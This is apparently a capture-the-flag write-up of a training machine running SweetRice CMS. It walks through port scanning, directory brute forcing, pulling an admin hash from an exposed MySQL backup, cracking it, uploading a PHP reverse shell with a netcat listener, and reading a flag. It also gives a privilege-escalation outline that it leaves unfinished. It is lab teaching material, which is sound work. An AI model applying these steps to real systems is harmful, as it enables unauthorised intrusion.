<img width="1983" height="793" alt="image" src="https://github.com/user-attachments/assets/f47a6162-2afa-4154-9318-0029ae3db4aa" />

# Getting Started: Initial Enumeration

## Learning Objectives

By completing this lab, you will practice:

* Web enumeration
* Directory brute forcing
* Credential extraction
* Password hash cracking
* File upload bypass
* Remote Code Execution (RCE)
* Reverse shell access
* Linux privilege escalation

---

## 1. Target Deployment

Click **Start Machine** and wait for the target to fully deploy.

Once the machine is online, open the web application:

```text
http://MACHINE_IP/
```

> Replace `MACHINE_IP` with the IP address assigned to your target machine.

---

## 2. Initial Enumeration

Start by scanning the target with Nmap.

```bash
nmap -Pn -p- -sC -sV MACHINE_IP -vvv -oA nmap_full
```

<img width="1434" height="882" alt="image" src="https://github.com/user-attachments/assets/63f19e39-588c-4df7-92cd-30a258b6b718" />

We see that ports 22 (SSH) and port 80 (HTTP) are open  
**What does it mean to have SSH enabled?**  
We need to find the username and password. For this, we need to check the websites.  
ssh username@IP


**STEP 2:WEBB PAGE SEARCH**  
STEP3: dirb http://10.10.230.160 or you can use gobuster .I started the dirb scan because it takes a lot of time.

### What are we looking for?

* Open ports
* Running services
* Service versions
* Web services
* Potential attack surface

Let's start with **dirb or Gobuster.**
---

## 3. Web Enumeration

If a web service is discovered, begin enumerating hidden directories and files.

### Gobuster

```bash
gobuster dir -u http://MACHINE_IP/ -w /usr/share/wordlists/dirb/common.txt
```

<img width="779" height="428" alt="image" src="https://github.com/user-attachments/assets/a83da68c-1f72-49eb-8a92-e302b3a1f3c4" />


### Dirb

```bash
dirb http://MACHINE_IP/
```

<img width="511" height="823" alt="image" src="https://github.com/user-attachments/assets/8eaa35d3-67b9-4805-8734-bdd2da67428e" />

### Goal
Discover hidden directories and files.
Identify the SweetRice CMS directory structure.
Map interesting paths for further enumeration.
Discovered Directories
/content/
/content/as/
/content/attachment/
/content/images/
/content/inc/
/content/js/

Directory enumeration reveals the SweetRice CMS structure and several paths worth further investigation.
---

## 4. VISETED CONTENT

<img width="1920" height="932" alt="image" src="https://github.com/user-attachments/assets/ae446187-3b98-42a0-96ab-6ecb8a2dae23" />

<img width="1402" height="1122" alt="image" src="https://github.com/user-attachments/assets/2fb305fe-0f1e-41f9-9c97-15af6d8c58df" />

This message says:Website Under Construction: The website is still in the development phase.  
So the guy is working slowly, LAZYADMIN!!

Unlike the other directories, we can see /inc and /as directories. Let's proceed with our operations by examining these 2 directories.

**==> DIRECTORY: http://10.10.139.224/content/as/**

<img width="1920" height="932" alt="image" src="https://github.com/user-attachments/assets/80b403d4-4ac2-40ac-9046-f20abe0ec559" />

In this directory, we encounter a login screen. Let's quickly take a look at the /inc directory to gather more information about this screen.

==> DIRECTORY: http://10.10.139.224/content/inc/

<img width="1920" height="932" alt="image" src="https://github.com/user-attachments/assets/6687ba65-0b6a-4535-b262-d4e2efcb73c7" />

Here's a revised version of the sentence:

In this directory, there is also a `mysql_backup` folder, which contains backups of all the admin's databases. We found an SQL file here and opened it.

Let's try to find the username and password in this database.

<img width="1920" height="932" alt="image" src="https://github.com/user-attachments/assets/165e6021-0d58-4342-9019-282a8b38fd5e" />

click it

<img width="1920" height="931" alt="image" src="https://github.com/user-attachments/assets/0bd54fc2-607a-4f3c-95a2-897217860e8b" />

**Credential Discovery / Hash Cracking**

If the password is stored as a hash, first identify the hash type and then attempt to recover the plaintext password using an authorized password-recovery tool.

Useful tools include:

* CrackStation
* Hashes.com
* John the Ripper

### John the Ripper

## Hash Cracking

Example:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Display recovered credentials:

```bash
john --show hash.txt
```

From the backup file, we identified the following credentials:

```text
Username: manager
Password Hash: 42f749ade7f9e195bf475f37a44cafcb
```

The password is stored as a hash, so our next step is to identify and attempt to crack it using CrackStation.

After successfully recovering the password, we can use the discovered credentials to attempt to log in to the SweetRice CMS.

<img width="1920" height="932" alt="image" src="https://github.com/user-attachments/assets/6f0fea7d-2eed-430d-ab84-29a20f08f6ae" />

```text
Username: manager
Password: Password123
```

Let's try to access the webpage:

```text
http://10.10.180.128/content/as/
```

<img width="1920" height="932" alt="image" src="https://github.com/user-attachments/assets/e3472e92-1d46-4291-a16e-5d5d903d8ef8" />

<img width="1920" height="932" alt="image" src="https://github.com/user-attachments/assets/f5a9c228-e1bb-442c-bf38-29662a1575be" />

We changed the website status to `Running`.

<img width="1920" height="932" alt="image" src="https://github.com/user-attachments/assets/c65dfe47-89a4-4dad-bd3c-fb03321f32ad" />

## Reverse Shell

After successfully logging in, we start poking around the panel. :) Let's try to get a reverse shell and use a PHP reverse shell code from GitHub.

```text
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
```

To access MySQL databases, we need valid credentials and a connection to the MySQL server. However, if we want to execute commands on the server, we can use a reverse shell.

In the reverse shell, we need to change the **`CHANGE THIS`** sections.

- **LHOST (Local Host):** This is the attacker's machine IP address. It's where the exploit sends information or establishes a connection after successfully compromising a target.
- **RHOST (Remote Host):** This is the target's machine IP address. It's the system being attacked by the exploit.

<img width="1920" height="932" alt="image" src="https://github.com/user-attachments/assets/200f2464-25f2-4bcf-96d4-4386e3c2e2b9" />

Let's copy the code here and modify the necessary parts (IP and port). We use our local IP address and port `9001`.

<img width="1918" height="802" alt="image" src="https://github.com/user-attachments/assets/0b6cf3fc-05dd-4aac-a12c-c1ce49496daf" />

I will check the `content/inc/ads/` directory:

```text
http://10.10.180.128/content/inc/ads/
```

<img width="957" height="377" alt="image" src="https://github.com/user-attachments/assets/089fb684-99fa-4407-bd2e-f5d59edbeafc" />

## Create the Reverse Shell File

Create a file for the reverse shell payload:

```bash
nano reverse-shell.php
```

Next, start a Netcat listener on the Kali machine to wait for the incoming connection:

```bash
nc -lvnp 9001
```
<img width="1672" height="941" alt="image" src="https://github.com/user-attachments/assets/fce3d625-67e5-4fb9-bb64-ac3a4e97dd37" />

listening is starting and go to content/inc/ads click **file name**reverse-shell

we created the shell as a successfully

<img width="1920" height="931" alt="image" src="https://github.com/user-attachments/assets/d16146dd-745a-4728-8934-5fa0ecdc4dbd" />


### Initial Shell Access

Start a Netcat listener:

nc -lvnp 9001

Once the reverse shell connects, verify the current user:

whoami
# www-data

Navigate to the user's home directory:

cd /home/itguy
ls

Several interesting files are discovered, including:

- backup.pl
- mysql_login.txt
- user.txt

Read the user flag:

cat user.txt

# THM{63e5bce9271952aad1113b6f1ac28a07}
```

**Result:** We successfully gained a shell as `www-data`, enumerated the `itguy` home directory, and obtained the `user.txt` flag.


---













## 13. Privilege Escalation Enumeration

Begin local privilege escalation enumeration.

First, check the current user:

```bash
whoami
```

```bash
id
```

Then inspect sudo permissions:

```bash
sudo -l
```

Look for:

* Commands executable as root
* `NOPASSWD` entries
* Dangerous binaries
* Misconfigured sudo permissions

Example:

```text
User → sudo -l → Misconfiguration → Privilege Escalation
```

---

## 14. Privilege Escalation

If `sudo -l` reveals a vulnerable or misconfigured binary, research whether it can be abused for privilege escalation.

A useful reference is **GTFOBins**.

```text
sudo -l
   ↓
Identify Allowed Binary
   ↓
GTFOBins
   ↓
Privilege Escalation
   ↓
Root
```

After exploiting the identified misconfiguration, verify your privileges:

```bash
whoami
```

Expected result:

```text
root
```

You can also verify with:

```bash
id
```

---

## 15. Root Flag

Once root access is obtained, locate the root flag.

```bash
find / -type f -name "root.txt" 2>/dev/null
```

Then read it:

```bash
cat /root/root.txt
```

### Result

```text
Root Flag: __________________
```

---

# Attack Path Summary

```text
Nmap Enumeration
       ↓
Web Enumeration
       ↓
Directory Brute Force
       ↓
Backup File Discovered
       ↓
Credential Extraction
       ↓
Hash Cracking
       ↓
Authenticated Login
       ↓
File Upload / RCE
       ↓
Reverse Shell
       ↓
User Access
       ↓
sudo -l
       ↓
Misconfiguration
       ↓
Privilege Escalation
       ↓
ROOT
```

---

## Key Takeaways

This lab demonstrates how multiple small security weaknesses can be chained together into a complete compromise.

```text
Information Disclosure
        +
Weak Credential Storage
        +
Insecure File Upload
        +
Sudo Misconfiguration
        =
Full System Compromise
```

The most important lesson is to **enumerate carefully and follow the evidence**. A simple exposed backup file can become the starting point for complete system compromise.

















